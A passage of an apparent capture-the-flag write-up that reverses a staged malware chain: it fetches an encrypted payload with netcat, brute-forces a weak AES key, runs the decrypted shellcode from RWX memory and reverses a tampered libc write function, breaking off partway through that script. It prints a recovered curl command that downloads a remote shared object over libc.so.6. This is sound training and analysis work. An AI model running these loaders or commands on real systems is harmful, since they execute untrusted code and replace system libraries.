<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">echo</span> <span class="s2">&#34;SK-CERT</span><span class="si">{g3771ng_p4yl04d}</span><span class="s2">&#34;</span> <span class="o">|</span> <span class="n">nc</span> <span class="mf">195.168.112.4</span> <span class="mi">7052</span>  <span class="o">&gt;</span> <span class="n">payload</span><span class="o">.</span><span class="n">bin</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;openssl/evp.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;openssl/aes.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">gen_seed</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">major</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">minor</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">major</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">minor</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">major</span> <span class="o">^</span> <span class="n">minor</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">^</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">13</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x5bd1e995</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="n">val</span> <span class="o">^</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="mi">15</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="kt">int</span> <span class="nf">decrypt</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">in_file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">out_file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">FILE</span><span class="o">*</span> <span class="n">f</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">in_file</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nf">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="kt">long</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">ftell</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nf">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">enc</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nf">fread</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="n">iv</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="nf">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="n">iv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dec</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">len</span> <span class="o">+</span> <span class="n">AES_BLOCK_SIZE</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="kt">int</span> <span class="n">l</span><span class="p">,</span> <span class="n">dec_len</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="n">EVP_CIPHER_CTX</span><span class="o">*</span> <span class="n">ctx</span> <span class="o">=</span> <span class="nf">EVP_CIPHER_CTX_new</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="nf">EVP_DecryptInit_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="nf">EVP_aes_128_cbc</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nf">EVP_DecryptUpdate</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">dec</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l</span><span class="p">,</span> <span class="n">enc</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="n">dec_len</span> <span class="o">=</span> <span class="n">l</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">EVP_DecryptFinal_ex</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">dec</span> <span class="o">+</span> <span class="n">l</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="n">dec_len</span> <span class="o">+=</span> <span class="n">l</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="n">FILE</span><span class="o">*</span> <span class="n">out</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">out_file</span><span class="p">,</span> <span class="s">&#34;wb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">            <span class="nf">fwrite</span><span class="p">(</span><span class="n">dec</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">dec_len</span><span class="p">,</span> <span class="n">out</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">            <span class="nf">fclose</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] %s ok</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">out_file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] %s fail</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">out_file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl">    <span class="nf">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">enc</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">dec</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">
</span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">infile</span> <span class="o">=</span> <span class="s">&#34;payload.bin&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">60</span><span class="cl">    <span class="kt">char</span> <span class="n">outfile</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">61</span><span class="cl">
</span></span><span class="line"><span class="ln">62</span><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">major</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">major</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">major</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">minor</span> <span class="o">=</span> <span class="mi">21</span><span class="p">;</span> <span class="n">minor</span> <span class="o">&lt;=</span> <span class="mi">41</span><span class="p">;</span> <span class="n">minor</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">64</span><span class="cl">            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed</span> <span class="o">=</span> <span class="nf">gen_seed</span><span class="p">(</span><span class="n">major</span><span class="p">,</span> <span class="n">minor</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">65</span><span class="cl">            <span class="nf">snprintf</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">outfile</span><span class="p">),</span> <span class="s">&#34;%u.%u_deciphered.bin&#34;</span><span class="p">,</span> <span class="n">major</span><span class="p">,</span> <span class="n">minor</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl">            <span class="nf">decrypt</span><span class="p">(</span><span class="n">infile</span><span class="p">,</span> <span class="n">outfile</span><span class="p">,</span> <span class="n">seed</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">67</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">68</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">69</span><span class="cl">
</span></span><span class="line"><span class="ln">70</span><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">71</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>After decrypting the payload and inspecting it with <code>xxd</code>, I noticed interesting strings like <code>/tmp/s</code> and <code>/bin/s</code>, suggesting that the payload was actually shellcode. To confirm this, I mapped the decrypted payload into memory and executed it. Upon running the shellcode, I observed that it dropped a file into the <code>/tmp</code> directory.</p>
<p><img src="https://gist.github.com/user-attachments/assets/dc18c9c7-0162-4e1b-8806-aedcf308b24e" alt="image"></p>
<hr>
<p>Code to map the decrypted payload into memory</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;2.38_deciphered.bin&#34;</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">)</span> <span class="p">{</span> <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nf">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="kt">long</span> <span class="n">sz</span> <span class="o">=</span> <span class="nf">ftell</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="nf">rewind</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">sz</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">buf</span><span class="p">)</span> <span class="p">{</span> <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;malloc&#34;</span><span class="p">);</span> <span class="nf">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">sz</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span> <span class="o">!=</span> <span class="n">sz</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;read&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nf">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">sz</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                     <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">
</span></span><span class="line"><span class="ln">34</span><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;&gt;&gt; running shellcode...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">mem</span><span class="p">)();</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">    <span class="nf">munmap</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>A quick check confirmed that the contents were successfully written into the <code>/tmp</code> directory.
<img src="https://gist.github.com/user-attachments/assets/77c13b5b-68b1-40d0-8d11-bf0a8745191d" alt="image"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">files</span><span class="o">.</span><span class="n">cybergame</span><span class="o">.</span><span class="n">sk</span><span class="o">/</span><span class="n">systemupdate</span><span class="o">-</span><span class="mi">2</span><span class="n">b174d89</span><span class="o">-</span><span class="mi">564</span><span class="n">b</span><span class="o">-</span><span class="mi">4024</span><span class="o">-</span><span class="n">acb6</span><span class="o">-</span><span class="n">b195f4c81a3c</span><span class="o">/</span><span class="n">lib</span><span class="o">.</span><span class="n">so</span><span class="c1">#SK-CERT{b1n_p4yl04d_d035_n07_s33m5_l1k3_c0mm4nd5} &gt; /lib_safe/x86_64-linux-gnu/libc.so.6                                                            </span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">SK-CERT{b1n_p4yl04d_d035_n07_s33m5_l1k3_c0mm4nd5}
</span></span></code></pre></div><h3 id="the-shared-object-prophecy">The Shared Object Prophecy</h3>
<p>Description</p>
<blockquote>
<p>Analyst Log â€“ 17:23 PM: I followed the execution trail. It ended in the most cursed way imaginable: custom libc Who writes their own libc? What kind of monster wakes up and chooses that? Greg is tired. Greg is afraid. Greg wants his weekend back.</p></blockquote>
<p>Solution</p>
<p>After retrieving the <code>libc.so</code> file from the previous part of the challenge, the description made it clear this was no ordinary standard library. It was custom and likely hiding something.</p>
<p>I spent hours going in circles, completely lost in its disassembly. I tried diffing it against the original <code>libc</code>, hoping for any meaningful differences. I scanned through dozens of standard functions, chasing false leads.</p>
<p>Eventually, while combing through some of the more commonly hooked libc functions, I landed on <code>_GI___libc_write</code>. Thatâ€™s where things clicked. The function had extra instructions and patterns that resembled encryption logic.</p>
<p>I wrote a script to reverse the transformations applied in that function and it paid off.</p>
<p>Sometimes, the best hiding place is right where you expect things to be &ldquo;normal.&rdquo;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">def</span> <span class="nf">s1</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">29</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;s1: bad len&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">29</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">29</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">i</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="o">~</span><span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="p">((</span><span class="n">x</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="p">((</span><span class="n">x</span> <span class="o">-</span> <span class="mh">0x7F</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x74</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="n">t</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="k">def</span> <span class="nf">s2</span><span class="p">(</span><span class="n">buf</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">14</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;s2: bad len&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
